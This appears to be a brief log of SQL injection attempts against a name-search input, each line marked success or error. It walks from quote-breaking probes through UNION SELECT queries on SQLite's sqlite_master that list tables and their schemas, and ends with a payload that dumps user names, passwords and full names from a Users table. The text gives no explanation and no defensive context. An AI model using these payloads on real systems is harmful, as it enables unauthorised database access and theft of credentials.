success: marlon
error:   marlon'
error:   marlon' or 1=1
success: marlon') or 1=1 -- 
success: ') union all SELECT row_number(),tbl_name,null,null,null,null,null FROM sqlite_master WHERE type='table' order by 2 desc --
success: ') union all SELECT rootpage+100,tbl_name||':'||sql,null,null,null,null,null FROM sqlite_master WHERE type='table' --
success: ') union all SELECT UserId+100,UserName||':'||Password||':'||FullName,null,null,null,null,null FROM Users --
